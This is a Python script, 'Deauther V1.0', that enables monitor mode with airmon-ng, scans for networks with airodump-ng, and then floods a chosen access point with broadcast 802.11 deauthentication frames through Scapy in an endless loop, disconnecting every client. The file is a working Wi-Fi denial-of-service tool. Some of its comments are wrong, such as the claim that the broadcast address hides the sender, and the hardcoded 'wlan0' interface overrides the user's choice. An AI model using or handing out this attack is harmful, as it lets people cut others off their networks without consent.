from scapy.all import * #Importing Scapy allows me Deauthenticate everyone from a target network
import subprocess #Importing subprocess because it allows me to call certain commands in the terminal, such as airmon-ng and airodump-ng

subprocess.call('clear', shell=True) #Clear the terminal screen
print('.........................................')
print('Deauther V1.0 BY SIDTUBE')
print('\n'*3)
print('Now listing available network cards')
print('\n'*3)
print('.........................................')
subprocess.call('airmon-ng', shell=True) #Call airmon-ng to show the user a list of available network cards on their device

print('\n'*3)
#start up monitor mode on a network card
networkCard = raw_input('Please enter the name of the network card you wish to use: ')

#Start monitor mode on the selected device and run 'airmon-ng check kill' to kill of any processes that may be interfering with the network card
subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCard = 'wlan0' #you can set your custom name of interface eg: 'wlan0mon'
#try to scan for available network cards on the device
try:
	subprocess.call('clear', shell=True) #Clear the terminal screen
	print('Now scanning for available networks, press ctrl+c to exit the scan')
	subprocess.call('airodump-ng {}'.format(networkCard), shell=True) #Use airodump-ng to start scanning for available networks
except KeyboardInterrupt: #If the user tries to end the program with ctrl+c then the program will pick this up and continue running the rest of the code, so that the user is able to see the output of the scan
	print(''*3)


brdMac = 'ff:ff:ff:ff:ff:ff' #brdMac is the broadcast macaddress variable, we set it to all f's because we want to hide where we are sending the packets from
BSSID = raw_input('Please enter the BSSID/MAC address of the AP: ') #Let the user input the MAC address of the router
print('Sending deauth packets now, press ctrl+c to end the attack')
print(''*5)

#try to send deauth packets to the target
try:
        #infinite loop to keep the attack running forever, this loop is for setting up the deauth packet and sending it
	while True:                
                #This creates a Dot11Deauth packet that will be used to kick everyone of the target network
                #Addr1 is the broadcast addr
                #Addr2 is the target addr
                #Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network	
		pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
		sendp(pkt, iface = networkCard, count = 100000, inter = .0001) #Send deauth packet
except KeyboardInterrupt: #Caputer the user pressing crtl+c to exit the program. Then the code stops monitor mode on the network card and closes out
	print('Cleaning up...')
	subprocess.call('airmon-ng stop {}'.format(networkCard), shell=True) #stop monitor mode on the network card
	subprocess.call('clear', shell=True) #Clear terminal window